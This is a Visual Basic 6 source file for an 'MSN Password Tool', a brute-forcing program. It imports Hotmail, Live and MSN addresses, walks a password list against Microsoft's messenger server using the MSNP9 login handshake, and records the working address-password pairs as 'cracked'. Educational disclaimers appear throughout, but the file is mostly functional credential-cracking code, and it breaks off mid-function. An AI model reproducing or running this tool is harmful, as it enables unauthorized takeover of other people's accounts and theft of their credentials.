VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Begin VB.Form frmMain 
   AutoRedraw      =   -1  'True
   BackColor       =   &H00E0E0E0&
   BorderStyle     =   1  'Fixed Single
   Caption         =   " MSN Password Tool - by Dr Jeeni"
   ClientHeight    =   6030
   ClientLeft      =   12840
   ClientTop       =   4650
   ClientWidth     =   5280
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H00000000&
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   6030
   ScaleWidth      =   5280
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame4 
      Height          =   30
      Left            =   113
      TabIndex        =   12
      Top             =   4680
      Width           =   5055
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00E0E0E0&
      Caption         =   "Progress"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2655
      Left            =   113
      TabIndex        =   15
      Top             =   2730
      Width           =   5055
      Begin ComctlLib.ProgressBar pbADR 
         Height          =   210
         Left            =   210
         TabIndex        =   16
         Top             =   1050
         Width           =   4695
         _ExtentX        =   8281
         _ExtentY        =   370
         _Version        =   327682
         Appearance      =   0
      End
      Begin ComctlLib.ProgressBar pbPAS 
         Height          =   210
         Left            =   210
         TabIndex        =   17
         Top             =   1575
         Width           =   4695
         _ExtentX        =   8281
         _ExtentY        =   370
         _Version        =   327682
         Appearance      =   0
      End
      Begin ComctlLib.ProgressBar pbTotal 
         Height          =   210
         Left            =   210
         TabIndex        =   18
         Top             =   2250
         Width           =   4695
         _ExtentX        =   8281
         _ExtentY        =   370
         _Version        =   327682
         Appearance      =   0
      End
      Begin ComctlLib.ProgressBar pbCurrent 
         Height          =   210
         Left            =   210
         TabIndex        =   19
         Top             =   525
         Width           =   4695
         _ExtentX        =   8281
         _ExtentY        =   370
         _Version        =   327682
         Appearance      =   0
         Max             =   5
      End
      Begin VB.Label lblCurrent 
         AutoSize        =   -1  'True
         BackColor       =   &H00E0E0E0&
         Caption         =   "Current Operation:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   210
         TabIndex        =   23
         Top             =   315
         Width           =   1380
      End
      Begin VB.Label Label5 
         AutoSize        =   -1  'True
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total Progress:"
         Height          =   195
         Left            =   210
         TabIndex        =   22
         Top             =   2040
         Width           =   1275
      End
      Begin VB.Label lblPAS 
         AutoSize        =   -1  'True
         BackColor       =   &H00E0E0E0&
         Caption         =   "Password List:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   210
         TabIndex        =   21
         Top             =   1365
         Width           =   1035
      End
      Begin VB.Label lblADR 
         AutoSize        =   -1  'True
         BackColor       =   &H00E0E0E0&
         Caption         =   "Address List:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   210
         TabIndex        =   20
         Top             =   840
         Width           =   930
      End
   End
   Begin prjMSN.lvButtons_H cmdAction 
      Default         =   -1  'True
      Height          =   375
      Left            =   150
      TabIndex        =   0
      Top             =   5550
      Width           =   1470
      _ExtentX        =   2593
      _ExtentY        =   661
      Caption         =   "&START"
      CapAlign        =   2
      BackStyle       =   2
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      cFHover         =   0
      LockHover       =   2
      cGradient       =   0
      Mode            =   0
      Value           =   0   'False
      cBack           =   -2147483633
   End
   Begin MSWinsockLib.Winsock wskTransfer 
      Left            =   1680
      Top             =   5520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin prjMSN.lvButtons_H cmdClose 
      Height          =   375
      Left            =   4313
      TabIndex        =   6
      Top             =   5550
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   661
      Caption         =   "&close"
      CapAlign        =   2
      BackStyle       =   2
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      cGradient       =   0
      Mode            =   0
      Value           =   0   'False
      cBack           =   -2147483633
   End
   Begin VB.Timer tmrTimeout 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1680
      Top             =   5490
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00E0E0E0&
      Height          =   2700
      Left            =   113
      TabIndex        =   7
      Top             =   30
      Width           =   5055
      Begin VB.Frame Frame5 
         Height          =   30
         Left            =   3375
         TabIndex        =   14
         Top             =   1950
         Width           =   1485
      End
      Begin prjMSN.lvButtons_H cmdImportAddress 
         Height          =   360
         Left            =   3375
         TabIndex        =   3
         Top             =   870
         Width           =   1485
         _ExtentX        =   2619
         _ExtentY        =   635
         Caption         =   "&import addresses"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.TextBox txtInfo 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Terminal"
            Size            =   9
            Charset         =   255
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C00000&
         Height          =   1485
         Left            =   165
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   11
         Text            =   "frmMain.frx":57E2
         Top             =   1050
         Width           =   3075
      End
      Begin VB.Frame Frame3 
         Height          =   30
         Left            =   0
         TabIndex        =   10
         Top             =   705
         Width           =   5055
      End
      Begin VB.TextBox txtDB 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   6.75
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C00000&
         Height          =   285
         Left            =   990
         Locked          =   -1  'True
         TabIndex        =   2
         Text            =   "C:\Documents and Settings\stinger\Desktop\msn.mdb"
         Top             =   270
         Width           =   3105
      End
      Begin prjMSN.lvButtons_H cmdSetDB 
         Height          =   300
         Left            =   4185
         TabIndex        =   1
         Top             =   255
         Width           =   660
         _ExtentX        =   1164
         _ExtentY        =   529
         Caption         =   "s&et"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin prjMSN.lvButtons_H cmdView 
         Height          =   360
         Left            =   3375
         TabIndex        =   5
         Top             =   2175
         Width           =   1485
         _ExtentX        =   2619
         _ExtentY        =   635
         Caption         =   "&view cracked"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin prjMSN.lvButtons_H cmdOptions 
         Height          =   360
         Left            =   3375
         TabIndex        =   4
         Top             =   1350
         Width           =   1485
         _ExtentX        =   2619
         _ExtentY        =   635
         Caption         =   "&password options"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   222
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.Label Label6 
         AutoSize        =   -1  'True
         BackColor       =   &H00E0E0E0&
         Caption         =   "Database:"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   210
         Left            =   210
         TabIndex        =   9
         Top             =   360
         Width           =   735
      End
      Begin VB.Label Label3 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "I N F O"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   165
         TabIndex        =   8
         Top             =   855
         Width           =   3075
      End
   End
   Begin MSComDlg.CommonDialog comDlg 
      Left            =   1680
      Top             =   5490
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      Filter          =   "*.mdb"
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   1680
      Top             =   5520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblSSLlayer 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   225
      Left            =   2610
      TabIndex        =   24
      Top             =   5640
      Width           =   225
   End
   Begin VB.Label lblPeriod 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   225
      Left            =   2880
      TabIndex        =   13
      Top             =   5640
      Width           =   225
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Const strServer As String = "messenger.hotmail.com"
Const lngPort As Long = 1863

Public MSPAuth As String, logintime As String, kv As String, SID As String

Dim strCurrentServer As String
Dim lngCurrentPort As Long
Public intTrailid As Integer
Dim intConnState As Integer
Dim strLastSendCMD As String
Dim DoneS As Boolean
Dim Result As String

Dim ADR As Recordset

Dim bytPeriod As Byte
Dim bytTimerMax As Byte
Dim intFound As Integer
Dim intADR As Integer
Dim intPAS As Integer
Dim TempADR, TempPAS As String

Public Sub IncrementTrailID()
    intTrailid = intTrailid + 1
End Sub

Sub IncrementState()
    intConnState = intConnState + 1
End Sub

Sub ResetVars()
    intConnState = 0
    intTrailid = 1
End Sub

Public Sub ProcessData(strData As String)
    strBuffer = strBuffer & strData
End Sub

Private Sub cmdClose_Click()
    If cmdAction.Caption = "&STOP" Then
        Dim Resp As VbMsgBoxResult
        Resp = MsgBox("Stop brute forcing and close progam, are you sure?", vbYesNo + vbDefaultButton2 + vbExclamation)
        If Resp = vbNo Then Exit Sub
    End If
    End
End Sub

Private Sub cmdOptions_Click()
    If Dir(txtDB.Text) = "" Then
        MsgBox "Could not open database or database does not exist.", vbCritical
        Exit Sub
    Else
        Set db = OpenDatabase(txtDB.Text)
        Set PAS = db.OpenRecordset("tblPassword", dbOpenDynaset)
    End If

    frmOptions.Show vbModal
End Sub

Private Sub cmdView_Click()
    If cmdAction.Caption = "&STOP" Then
CHECK:
        If rsFound.RecordCount = 0 Then
            MsgBox "Nothing found.", vbInformation
        Else
            frmFound.Show vbModal
        End If
    Else
        'verify the db path:
        If Dir(txtDB.Text) = "" Then
            MsgBox "Could not open database or database does not exist.", vbCritical
        Else
            Set db = OpenDatabase(txtDB.Text)
            Set rsFound = db.OpenRecordset("tblFound", dbOpenDynaset)
            GoTo CHECK
        End If
    End If
End Sub



'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


Private Sub cmdImportAddress_Click()
    Dim temp As String
    Dim ArrAddress() As String
    Dim strAddress As String
    Dim Resp As VbMsgBoxResult

    'Initializing dialog box:
    comDlg.DialogTitle = "Import address"
    comDlg.Filter = "txt (*.txt)|*txt"
    comDlg.ShowOpen
    strAddress = comDlg.FileName
    
    'File name can not be blank:
    If strAddress = "" Or _
       Dir(strAddress) = "" Then Exit Sub
    
    'Confirm: Append or over-write:
    Resp = MsgBox("Do you want to over-write to the target list or do you want to append to it?" & _
                    vbCrLf & vbCrLf & "Click Yes to append, No to over-write or Cancel to abort operation.", vbYesNoCancel + _
                    vbExclamation + vbDefaultButton1)
    
    'Cancel:
    If Resp = vbCancel Then Exit Sub
    
    'Loading new target list to an array:
    Open strAddress For Input As 1
        temp = Input(FileLen(strAddress), 1)
    Close #1
    ArrAddress = Split(temp, vbCrLf)
    
    
    Set db = dao.OpenDatabase(txtDB.Text)
    Set ADR = db.OpenRecordset("tblAddress", dbOpenDynaset)
    
    If ADR.RecordCount = 0 Then GoTo Import
    ADR.MoveFirst
    
    'Over-write, clear target list before loading the new one:
    If Resp = vbNo Then
        Do Until ADR.EOF
            ADR.Delete
            ADR.MoveNext
        Loop
    End If
    
    ADR.MoveFirst
    
Import:
    Dim i, n As Integer
    For i = 0 To UBound(ArrAddress) - 1
        If InStr(1, UCase(ArrAddress(i)), "HOTMAIL") <> 0 Or _
           InStr(1, UCase(ArrAddress(i)), "LIVE") <> 0 Or _
           InStr(1, UCase(ArrAddress(i)), "MSN") <> 0 Then
            ADR.AddNew
                n = n + 1
                ADR!address = ArrAddress(i)
            ADR.Update
        End If
    Next i
    
    MsgBox n & " addresses imported successfully.", vbInformation
End Sub

Private Sub cmdSetDB_Click()
    comDlg.Filter = "mdb (*.mdb)|*mdb"
    comDlg.ShowOpen
    If Not comDlg.FileName = "" Then
        Me.txtDB.Text = comDlg.FileName
        SaveSetting "MSN Passowrd Tool", "Paths", "Database", Me.txtDB.Text
    End If
End Sub

Private Sub cmdAction_Click()
    Dim Resp As VbMsgBoxResult
    Dim AddProg, PassProg As String
    
    If cmdAction.Caption = "&START" Then
        
        'Validating DB:
        If Dir(Me.txtDB.Text) = "" Then
            MsgBox "Could not open database or database does not exist.", vbCritical
            Exit Sub
        End If
                
        'Confirming action:
        Resp = MsgBox("Start brute forcing, are you sure?", vbYesNo + vbDefaultButton1 + vbQuestion)
        If Resp = vbNo Then Exit Sub
         
        'Opening db and R:
        Set db = OpenDatabase(txtDB.Text)
        Set ADR = db.OpenRecordset("tblAddress", dbOpenDynaset)
        Set PAS = db.OpenRecordset("tblPassword", dbOpenDynaset)
        Set rsFound = db.OpenRecordset("tblFound", dbOpenDynaset)
        
    
        If ADR.RecordCount <> 0 Then
            ADR.MoveLast
            ADR.MoveFirst
        Else
            MsgBox "Address list is empty. Can not continue.", vbCritical
            Exit Sub
        End If
        
        If PAS.RecordCount <> 0 Then
            PAS.MoveLast
            PAS.MoveFirst
        Else
            MsgBox "Password list is empty. Can not continue.", vbCritical
            Exit Sub
        End If
        
        cmdAction.Caption = "&STOP"
        tmrTimeout.Enabled = True
        cmdImportAddress.Enabled = False
        cmdOptions.Enabled = False
        cmdSetDB.Enabled = False
         
        AddProg = GetSetting("MSN Tool", "Data", "Address progress", 0)
        PassProg = GetSetting("MSN Tool", "Data", "Password progress", 0)
        
        'Prompt for resume:
        If AddProg <> 0 Or PassProg <> 0 Then
            Resp = MsgBox("Do you want to continue from where you left off the last session?", vbQuestion + vbYesNo + vbDefaultButton1)
            If Resp = vbYes Then
                ADR.Move Val(AddProg)
                PAS.Move Val(PassProg)
            End If
        End If
        
        Me.txtInfo = Replace(txtInfo.Text, "ADDRESSES: ---", "ADDRESSES: " & ADR.RecordCount)
        Me.txtInfo = Replace(txtInfo.Text, "PASSWORDS: ---", "PASSWORDS: " & PAS.RecordCount)
        Me.txtInfo = Replace(txtInfo.Text, "D        : ---", "D        : 0")
        
        pbADR.Max = ADR.RecordCount
        pbPAS.Max = PAS.RecordCount
        pbTotal.Max = PAS.RecordCount
        
        
        TempADR = ADR!address
        TempPAS = PAS!Password
        
        Me.txtInfo.Text = Replace(txtInfo.Text, "---", TempADR)
        Me.txtInfo.Text = Replace(txtInfo.Text, "--", TempPAS)
        
        ResetVars
        wskTransfer.Close
        wskTransfer.Connect strServer, lngPort
        
        intFound = 0
    Else
        Resp = MsgBox("Stop crcking, are you sure?", vbYesNo + vbDefaultButton2 + vbExclamation)
        If Resp = vbNo Then Exit Sub
        
        cmdImportAddress.Enabled = True
        cmdOptions.Enabled = True
        cmdSetDB.Enabled = True
        
        'rest bars:
        Me.pbADR.Value = 0
        Me.pbCurrent.Value = 0
        Me.pbTotal.Value = 0
        Me.pbPAS.Value = 0
        
        cmdAction.Caption = "&START"
        
        Me.txtInfo.Text = Replace(txtInfo.Text, TempADR, "---")
        Me.txtInfo.Text = Replace(txtInfo.Text, TempPAS, "--")
        
        tmrTimeout.Enabled = False
        Me.pbADR.Value = 0
        Me.pbPAS.Value = 0
        Me.pbCurrent.Value = 0
        
        wskTransfer.Close
        Winsock1.Close
        
        ADR.Close
        PAS.Close
        rsFound.Close
        db.Close
    End If
End Sub

Private Sub Form_Load()
    Dim temp As String
    bytTimerMax = 10
    temp = GetSetting("MSN Tool", "Paths", "Database", "path not defined")
    Me.txtDB.Text = temp
End Sub

Public Sub msgsend(Message As String)
    On Error Resume Next
    wskTransfer.SendData Message
    IncrementTrailID
    If IDEDebug = True Then
        Debug.Print Message & vbCrLf
    End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
    If cmdAction.Caption = "&STOP" Then
        Dim Resp As VbMsgBoxResult
        Resp = MsgBox("Stop brute forcing and close progam, are you sure?", vbYesNo + vbDefaultButton2 + vbExclamation)
        If Resp = vbNo Then Cancel = True
    End If
End Sub

'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


Private Sub wskTransfer_DataArrival(ByVal bytesTotal As Long)

    On Error Resume Next
    
    Dim strRawData As String, strInput As String
    Dim strHashParams As String
    Dim strResponse As String
    Dim varParams As Variant
    
    wskTransfer.GetData strRawData, vbString
    
    'Updating progress bars labels:
    lblADR.Caption = "Address List (" & ADR.AbsolutePosition + 1 & " of " & ADR.RecordCount & "):"
    lblPAS.Caption = "Password List (" & PAS.AbsolutePosition + 1 & " of " & PAS.RecordCount & "):"
    
    Select Case intConnState
    Case 1
        bytPeriod = 0
        bytTimerMax = 10
        ' Handshake
        '-----------------------------
        strLastSendCMD = "VER " & intTrailid & " MSNP9 MSNP8 CVR0" & vbCrLf
        msgsend strLastSendCMD
         
         pbCurrent.Value = intConnState
        
        Call IncrementTrailID
        Call IncrementState
    Case 2
        bytPeriod = 0
        bytTimerMax = 10
        ' Send client information to DS
        '-----------------------------
        strLastSendCMD = "CVR " & intTrailid & " 0x0413 winnt 5.2 i386 MSNMSGR 6.0.0268 MSMSGS " & ADR!address & vbCrLf
        msgsend strLastSendCMD

        pbCurrent.Value = intConnState
        
        Call IncrementTrailID
        Call IncrementState
    Case 3
        bytPeriod = 0
        bytTimerMax = 10
        ' Send logonname (xxx@xxx.xxx) to DS
        '-----------------------------
        strLastSendCMD = "USR " & intTrailid & " TWN I " & ADR!address & vbCrLf
        msgsend strLastSendCMD
        
        pbCurrent.Value = intConnState
        
        Call IncrementTrailID
        Call IncrementState
    Case 4
        bytPeriod = 0
        bytTimerMax = 15
        'Send password to DS or move to other server
        '-----------------------------
        If UCase$(Left$(strRawData, 4)) = "USR " Then
            ' Get the hash supplied by the DS (Dispatch Server)
            h = InStr(LCase$(strRawData), " lc")
            strHashParams = Right$(strRawData, Len(strRawData) - h)
            ' Start the SSL-procedure:
            
            strResponse = DoSSL(strHashParams)
            
            ' Pass authentication result back to the DS:
            strLastSendCMD = "USR " & CStr(intTrailid) & " TWN S " & strResponse & vbCrLf
            msgsend strLastSendCMD
            
            pbCurrent.Value = intConnState
            
            Call IncrementTrailID
            Call IncrementState
        ElseIf UCase$(Left(strRawData, 4)) = "XFR " Then
            'Move to another server
            varParams = Split(strRawData, " ")
            strConnectionString = varParams(3)
            varParams = Split(strConnectionString, ":")
            strCurrentServer = varParams(0)
            lngCurrentPort = CLng(varParams(1))
            
            pbCurrent.Value = 0
            
            ResetVars
            wskTransfer.Close
            wskTransfer.Connect strCurrentServer, lngCurrentPort
        End If
    Case 5
        bytPeriod = 0
        bytTimerMax = 10
        pbCurrent.Value = intConnState
    
        If UCase$(Left$(strRawData, 4)) = "USR " Then
            Call IncrementState
    
            'The whole thing lies here...
            Layer = 0
            
            rsFound.AddNew
                rsFound!address = ADR!address
                rsFound!Password = PAS!Password
            rsFound.Update
            Dim intPoss As Integer
            Dim i As Integer
            
            Beep
            
            'Deleting the address that is matching a password from the address table.
            'But before that, need to check for the number of records in the table.
            'If there is a single record, delete it then close connection.
            'If two, delete the found address (record) then move cursor to the next one.
            'If more than that, delete it, requery recordset and then execute a loop
            'to jump to the recored next to the deleted one.
        'So,
        
                TempADR = ADR!address
                TempPAS = PAS!Password
                
            If ADR.RecordCount = 1 Then
                ADR.Delete
                pbADR.Max = 1
                MsgBox "Checking complete.", vbInformation
                
                'reset pbars:
                Me.pbADR.Value = 0
                Me.pbCurrent.Value = 0
                Me.pbTotal.Value = 0
                Me.pbPAS.Value = 0
                
                tmrTimeout.Enabled = False
                wskTransfer.Close
                Winsock1.Close
            ElseIf ADR.RecordCount = 2 Then
                ADR.Delete
                ADR.Requery
                
                ADR.MoveLast
                ADR.MoveFirst
                
                pbADR.Max = ADR.RecordCount
            Else
                intPoss = ADR.AbsolutePosition
                ADR.Delete
                ADR.Requery
                
                ADR.MoveLast
                ADR.MoveFirst
                pbADR.Max = ADR.RecordCount
                
                'Strangely, the recordset 'Move' method doesn't work here.
                'This is why I am using this loop to get back to where the address in deleted..
            'So,
                For i = 1 To intPoss
                    ADR.MoveNext
                Next i
                
            End If
            
            'Updating INFO window:
            Me.txtInfo = Replace(txtInfo.Text, "ADDRESSES: ---", "ADDRESSES: " & ADR.RecordCount)
            Me.txtInfo = Replace(txtInfo.Text, "PASSWORDS: ---", "PASSWORDS: " & PAS.RecordCount)
            Me.txtInfo = Replace(txtInfo.Text, "D        : ---", "D        : " & rsFound.RecordCount)
            
            
            'Saving progress to registry:
            SaveSetting "MSN Tool", "Data", "Password progress", PAS.AbsolutePosition
            SaveSetting "MSN Tool", "Data", "Address progress", ADR.AbsolutePosition
            
            Me.txtInfo.Text = Replace(Me.txtInfo.Text, TempADR, ADR!address)
            Me.txtInfo.Text = Replace(Me.txtInfo.Text, TempPAS, PAS!Password)
            
            'updating the log
            Me.txtInfo.Text = Replace(Me.txtInfo.Text, "D        : " & intFound, "D        : " & intFound + 1)
            Me.txtInfo.Text = Replace(Me.txtInfo.Text, "SS : " & ADR.RecordCount + 1, "SS : " & ADR.RecordCount)
            intFound = intFound + 1
            
            msgsend ("OUT")
            GoTo RESET
        Else
        
        pbCurrent.Value = 0
RESET:
            ResetVars
            Winsock1.Close
            wskTransfer.Close
            wskTransfer.Connect strCurrentServer, lngCurrentPort
        End If
    End Select
    
    pbADR.Value = ADR.AbsolutePosition + 1
    pbPAS.Value = PAS.AbsolutePosition + 1
    
    Exit Sub
End Sub

Private Sub GetVars(Data As String)
'If not authorized (invalid pass), move to next password

    unauthorized = InStr(1, Data, "Unauthorized")
    If unauthorized > 0 Then
        Layer = 0
        Winsock1.Close
        ResetVars
        
        TempADR = ADR!address
        TempPAS = PAS!Password
        
        If ADR.AbsolutePosition = ADR.RecordCount - 1 Then
            'Got to the end of the address list,
            'So, change the password if haven't reached the end too
            If PAS.AbsolutePosition = PAS.RecordCount - 1 Then
                'End of password list at this case means the end of the whole check worx
                'Resetting progress:
                SaveSetting "MSN Tool", "Data", "Password progress", "0"
                SaveSetting "MSN Tool", "Data", "Address progress", "0"
                
                'reset bars:
                Me.pbADR.Value = 0
                Me.pbCurrent.Value = 0
                Me.pbTotal.Value = 0
                Me.pbPAS.Value = 0
                
                tmrTimeout.Enabled = False
                cmdAction.Caption = "&START"
                Winsock1.Close
                wskTransfer.Close
                
                'Report it:
                MsgBox "Password list exhausted. Checking complete.", vbInformation
                Exit Sub
            Else
                'We are not at the end of the password list yet..
                'Get to the next password and to the first address:
                PAS.MoveNext
                ADR.MoveFirst
            End If
        Else
            'We are not at the end of the address list,
            'Move to next address:
            ADR.MoveNext
        End If

        
        Me.txtInfo.Text = Replace(Me.txtInfo.Text, TempADR, ADR!address)
        Me.txtInfo.Text = Replace(Me.txtInfo.Text, TempPAS, PAS!Password)
        
        If PAS.AbsolutePosition = PAS.RecordCount - 1 Then
            If pbTotal.Value <> pbTotal.Max Then
                pbTotal.Value = pbTotal.Value + 1
            End If
        End If
        
        pbADR.Value = ADR.AbsolutePosition + 1
        pbPAS.Value = PAS.AbsolutePosition + 1
        
        
        'Saving progress to registry:
        SaveSetting "MSN Tool", "Data", "Password progress", PAS.AbsolutePosition
        SaveSetting "MSN Tool", "Data", "Address progress", ADR.AbsolutePosition
        
        wskTransfer.Close
        wskTransfer.Connect strServer, lngPort
    End If
End Sub

Private Sub wskTransfer_Connect()
    intConnState = 1
    wskTransfer_DataArrival 0
End Sub


'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


Private Sub tmrTimeout_Timer()
    bytPeriod = bytPeriod + 1
    lblPeriod.Caption = bytPeriod
    If bytPeriod > bytTimerMax Then
        ResetVars
        Layer = 0
        bytPeriod = 0
        wskTransfer.Close
        wskTransfer.Connect strCurrentServer, lngCurrentPort
    End If
End Sub

Public Sub Winsock1_Close()
' Handle SSL connection
'-----------------------------------------------

    Layer = 0
    Winsock1.Close
